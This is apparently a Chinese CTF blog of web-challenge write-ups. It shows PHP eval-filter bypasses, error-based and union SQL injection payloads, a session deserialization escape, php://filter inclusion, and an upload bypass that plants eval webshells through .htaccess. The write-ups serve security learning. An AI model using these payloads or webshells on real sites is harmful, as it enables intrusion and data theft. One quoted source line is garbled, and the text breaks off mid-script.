<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;</code></p>
</blockquote>
<p>这个正则当中，<code>(?R)</code>是引用当前表达式的意思，即可以用<code>[a-z,_]+((?R)?)</code>替换<code>1(?R)</code>的位置</p>
<p><code>(?R)?</code>这里多一个<code>?</code>表示可以有引用，也可以没有。</p>
<p>理论写再多也没例子直观，这里举个例子：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">abc()</span><br><span class="line">abc(<span class="name">abc</span>())</span><br><span class="line">abc(<span class="name">abc</span>(<span class="name">abc</span>))</span><br><span class="line">abc(<span class="name">abc</span>(<span class="name">abc</span>(<span class="name">abc</span>())))</span><br></pre></td></tr></table></figure>

<p>就这么个意思</p>
<p>这里第一层过滤不能用协议读</p>
<p>那么只能依靠 PHP内置的函数来一层一层读了</p>
<h2 id="session-id-session-start"><a href="#session-id-session-start" class="headerlink" title="session_id(session_start())"></a>session_id(session_start())</h2><p>这里没有过滤<code>readfile()或者highlight_file()</code>函数，可以通过这个函数来读取文件内容</p>
<p>通过<code>session_id(session_start())</code>来读取<code>SESSION</code></p>
<p>然后设置<code>PHPSESSID</code>为<code>flag.php</code>即可</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226162711.png" alt=""></p>
<h2 id="array-rand"><a href="#array-rand" class="headerlink" title="array_rand()"></a>array_rand()</h2><p>首先通过<code>localeconv()</code>函数得到<code>.</code>用来指向当前路径</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226163356.png" alt=""></p>
<p>然后得得到第一个元素，这里方法很多</p>
<ul>
<li>array_shift($array) //第一个元素</li>
<li>array_pop($array) //最后一个元素</li>
<li>current($array) //第一个元素</li>
<li>end($array) //最后一个元素</li>
</ul>
<p>这样就通过<code>scandir(array_shift(localeconv))</code>获取到了当前目录</p>
<p>然后就可以读文件了</p>
<p>但这里<code>flag.php</code>不是第一个或者最后一个文件</p>
<p>不能直接<code>readfile</code>，读取到，得一个一个随机函数来随机读取到<code>flag.php</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165425.png" alt=""></p>
<p>然后通过<code>array_flip()</code>函数来交换键值对</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226164544.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165348.png" alt=""></p>
<p>最后通过<code>array_rand</code>来获取随机的键名</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165904.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165915.png" alt=""></p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">readfile(<span class="name">array_rand</span>(<span class="name">array_flip</span>(<span class="name">scandir</span>(<span class="name">current</span>(<span class="name">localeconv</span>())))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>即可随机读取到<code>flag</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226170031.png" alt=""></p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>这里刚做了一个<code>Sqli</code>的<code>Fuzz</code>字典，包括了<code>mysql</code>所有的关键字和函数和操作符</p>
<p>这关过滤了空格、and、union</p>
<p>那就先看看数据库名</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php</span><br><span class="line">?username=admin'or(extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(select(database())))))%<span class="number">23</span></span><br><span class="line">&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226192331.png" alt=""></p>
<p>然后爆表名</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">/check.php</span><br><span class="line">?username=1'or(extractvalue(0x0a,concat(0x0a,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">LIKE</span>(<span class="keyword">database</span>())))))%<span class="number">23</span></span><br><span class="line">&amp;<span class="keyword">password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226193617.png" alt=""></p>
<p>然后字段名</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php</span><br><span class="line">?username=<span class="number">1</span>'or(extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(select(group_concat(column_name))from(information_schema.columns)where(table_name)LIKE(<span class="string">"H4rDsq1"</span>)))))%<span class="number">23</span></span><br><span class="line">&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195038.png" alt=""></p>
<p>然后测试得到<code>flag</code>在<code>password</code>字段</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195532.png" alt=""></p>
<p>但只有前半截</p>
<p>那就先用<code>left</code>函数读取前半部</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195746.png" alt=""></p>
<p>然后用<code>right</code>函数读后半截即可</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226195832.png" alt=""></p>
<p>组合得到<code>flag</code></p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>这里查询解密给了一段注释</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226201605.png" alt=""></p>
<p>先<code>base32</code>后<code>base64</code>解码得到这个</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226201617.png" alt=""></p>
<p>得到注入点</p>
<p>然后看一下过滤，过滤了or（大写绕过）、</p>
<p>先看字段数一共三列</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226204249.png" alt=""></p>
<p>这里要判断用户名的字段位置，发现在第二个位置填<code>admin</code>时不会报错，其他位置会报错</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226214308.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226214245.png" alt=""></p>
<p>可以判断第一二三个位置分别为<code>id、username、password</code></p>
<p>用<code>Sqlmap</code>跑一下</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226221136.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226221620.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226222425.png" alt=""></p>
<p>但这个哈希解不开</p>
<p>剩下的我看别的师傅WP提到对比哈希，但我这里没有任何提示</p>
<p>但<code>union select</code>有个特性，当查询的信息不存在时，他会暂时新建一个新的数据，如下：</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226223101.png" alt=""></p>
<p>这时候可以我们自己生成一个哈希，然后用我们的密码进行登录</p>
<blockquote>
<p>name=1’ union select 0,’admin’,’202cb962ac59075b964b07152d234b70’%23</p>
<p>&amp;pw=123</p>
</blockquote>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226223134.png" alt=""></p>
<h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">      ($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给了源码，是<code>SESSION</code>反序列化的题目</p>
<p>提示要看<code>phpinfo</code>，这里看到了被包含的<code>flag</code>文件</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227180359.png" alt=""></p>
<p>接下来是反序列化读文件即可，但这里要读取的<code>img</code>被<code>SHA1</code>后不可读</p>
<p>那么就要想办法使得<code>img</code>可控为我们需要的<code>d0g3_f1ag.php</code>的<code>Base64</code>为<code>ZDBnM19mMWFnLnBocA==</code></p>
<p>这道题和之前做过的那个<code>piapiapia</code>很相似（应该是那个</p>
<p>那个是通过增长反序列化字符串长度从而导致溢出</p>
<p>这个是用过滤实现字符串变短，但<code>s:(len)</code>不变导致往后读取</p>
<p>由于存在<code>extract($_POST)</code>，使得我们可以控制<code>$_SESSION</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">	$filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">	$filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	$_SESSION[<span class="string">"user"</span>] = <span class="string">''</span>;</span><br><span class="line">	$_SESSION[<span class="string">'function'</span>] = <span class="string">''</span>;</span><br><span class="line">	$_SESSION[<span class="string">'img'</span>] = <span class="string">'ZDBnM19mMWFnLnBocA=='</span>;</span><br><span class="line">	</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line">	$a = filter(serialize($_SESSION));</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//	$s = unserialize($a);</span></span><br><span class="line"><span class="comment">//	var_dump($s);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里先得到我们<code>img</code>的序列化字段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span></span><br></pre></td></tr></table></figure>

<p>这里由于<code>$_SESSION[’img&#39;]</code>替换在序列化之前，所以说我们不能让<code>$_SESSION[’img&#39;]</code>出现在序列化的变量中</p>
<p>但却要求反序列化后出现<code>$_SESSION[’img&#39;]</code></p>
<p>那就需要想办法利用反序列化在对序列化对象长度达到长度并且被完整地<code>}</code>包裹后</p>
<p>他就会忽略后面的部分反序列化对象</p>
<p>就比如我们现在任意传入一个反序列化字符串</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227185604.png" alt=""></p>
<p>此时我们需要将<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</code>给反序列化，把<code>img_jiade</code>那一串给截断</p>
<p>就得拿<code>$_SESSION[&#39;function&#39;]</code>入手</p>
<p>这里j讲一下反序列化中一组变量的字符串形式构成：</p>
<blockquote>
<p><code>s:变量名长度:&quot;变量名&quot;;s:&quot;变量长度&quot;:s&quot;变量&quot;;</code></p>
</blockquote>
<p>这里不一定是<code>s</code>，即字符串，也可以是其他比如数组<code>a</code>之类的，只不过数组需要<code>{}</code>包裹而已，使用时需要修改</p>
<p>此时如果<code>$_SESSION[&#39;function&#39;] = &#39;a&#39;</code>时</p>
<p>他的序列化结果为：</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227190116.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;</span><br></pre></td></tr></table></figure>

<p>此时我们可以在后面跟上我们的真正的<code>img</code>的序列化结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;</span><br></pre></td></tr></table></figure>

<p>此时为了吞掉<code>function</code>的序列化结果，我们可以利用过滤来处理<code>user</code>的序列化值</p>
<p>比如现在设置<code>$_SESSION[&quot;user&quot;] = &#39;flagflagflagflag&#39;</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227190455.png" alt=""></p>
<p>会导致<code>flag</code>被替换掉，他的值为空，但是反序列化还得继续哇</p>
<p>他会尝试读取16长度的后半部分字符，如果后半部分满足反序列化的条件，即变量数等于3，反序列化结果以<code>}</code>结尾，他就会反序列化成功</p>
<blockquote>
<p>注意！反序列化会将双引号算作一个字符！！</p>
</blockquote>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227190937.png" alt=""></p>
<p>我们来计算一下下面字符串的长度</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">";s:8:"</span><span class="function"><span class="keyword">function</span>"</span>;s:<span class="number">59</span>:<span class="string">"a</span></span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227191031.png" alt=""></p>
<p>那我们需要构造6个<code>flag</code>从而可以吞并这部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">	$filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">	$filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	$_SESSION[<span class="string">"user"</span>] = <span class="string">'flagflagflagflagflagflag'</span>;</span><br><span class="line">	$_SESSION[<span class="string">'function'</span>] = <span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"a";&#125;'</span>;</span><br><span class="line">	$_SESSION[<span class="string">'img_jiade'</span>] = <span class="string">'ZDBnM19mMWFnLnBocA=='</span>;</span><br><span class="line">	</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line">	$a = filter(serialize($_SESSION));</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line">	$s = unserialize($a);</span><br><span class="line">	var_dump($s);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时过滤后的序列化结果为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">41</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;<span class="string">";s:9:"</span>img_jiade<span class="string">";s:20:"</span>ZDBnM19mMWFnLnBocA==<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>

<p>但还是反序列化没结果，原因是现在由于前面<code>a:3</code>需要存在三个变量，我们在后面再给他构造一个，记得用<code>;</code>和<code>}</code>来结束</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20200227194420722](/Users/a2u13/Library/Application Support/typora-user-images/image-20200227194420722.png)</p>
<p>可以看到成功逃逸出来，我们插入了本不应该在序列化字符串中存在的<code>img</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227195415.png" alt=""></p>
<p>得到<code>flag</code>的地方<code>/d0g3_fllllllag</code>，<code>base64</code>编码一下<code>L2QwZzNfZmxsbGxsbGFn</code>，长度刚好20，把编码后的替换一下即可得到<code>flag</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200127.png" alt=""></p>
<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200645.png" alt=""></p>
<p>很简单文件包含，没任何过滤，直接用<code>php://filter</code>读即可</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200721.png" alt=""></p>
<p>解码得到<code>flag</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200227200744.png" alt=""></p>
<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给了源代码，分为两个部分</p>
<h2 id="get-the-flag函数"><a href="#get-the-flag函数" class="headerlink" title="get_the_flag函数"></a>get_the_flag函数</h2><p>用来上传文件，其中过滤都很熟悉，不容许上传<code>ph</code>开头的后缀文件</p>
<p>不容许上传包括<code>&lt;?</code>开头的文件</p>
<p>还有<code>exif_imagetype</code>检查</p>
<p>下面讲绕过姿势</p>
<h3 id="ph后缀绕过"><a href="#ph后缀绕过" class="headerlink" title="ph后缀绕过"></a>ph后缀绕过</h3><p>这里可以试试上传<code>.htaccess</code>或者<code>.user.ini</code>来改解析</p>
<p>然后上传正常图片文件来解析成<code>php</code>文件来执行</p>
<h3 id="lt-内容绕过"><a href="#lt-内容绕过" class="headerlink" title="&lt;?内容绕过"></a>&lt;?内容绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langeuage</span>=<span class="string">'php'</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'a2u13'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>只适用于php7一下版本</p>
<p>这里可以通过<code>php://filter</code>来解读编码后的数据</p>
<h3 id="exif-imagetype绕过"><a href="#exif-imagetype绕过" class="headerlink" title="exif_imagetype绕过"></a>exif_imagetype绕过</h3><p>对于图片文件等加上<code>GIF89a</code>幻数即可绕过</p>
<p>但是对于<code>.htaccess</code>文件来说加上这个不解析</p>
<p>所以得专门针对<code>.htaccess</code>绕过</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">#def</span>ine <span class="attribute">width</span> <span class="number">1337</span></span><br><span class="line"><span class="number">#def</span>ine <span class="attribute">height</span> <span class="number">1337</span> </span><br><span class="line">AddType application/x-httpd-php .a</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_xxxxxx/shell.a"</span></span><br></pre></td></tr></table></figure>

<p>对于要解析的那个文件，加上<code>GIF86a</code>的同时得补足8字节，否则会导致<code>base64</code>把后面的编码部分给解码错了</p>
<p>所以我们要上传的<code>a2u13.a</code>文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89axx</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4=</span><br></pre></td></tr></table></figure>

<h2 id="命令执行部分"><a href="#命令执行部分" class="headerlink" title="命令执行部分"></a>命令执行部分</h2><p>这里给正则fuzz了一下，过了出了可用字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">for</span>($hhh=<span class="number">32</span>;$hhh&lt;=<span class="number">126</span>;$hhh++)&#123;</span><br><span class="line">	<span class="keyword">if</span> ( !preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($hhh)) )&#123;</span><br><span class="line">		<span class="keyword">echo</span> chr($hhh);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果如下:</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">!#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>能用的就这几个，这里可以参考P牛的无字母数字getshell这篇文章</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p>有三个方法：</p>
<ul>
<li>异或</li>
<li>取反</li>
<li>弱类型强制转换</li>
<li>自增</li>
</ul>
<p>但这里过滤了<code>~</code>，导致不能取反，而且也有长度限制，不能自增</p>
<p>这里只能使用异或大法了</p>
<p>这里直接构造<code>get_the_flag</code>会长度超过限制</p>
<p>所以可以构造<code>$_GET{a}()</code>，其中<code>a=get_the_flag</code>的方式来调用<code>get_the_flag()</code>函数</p>
<p>这里找了个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = 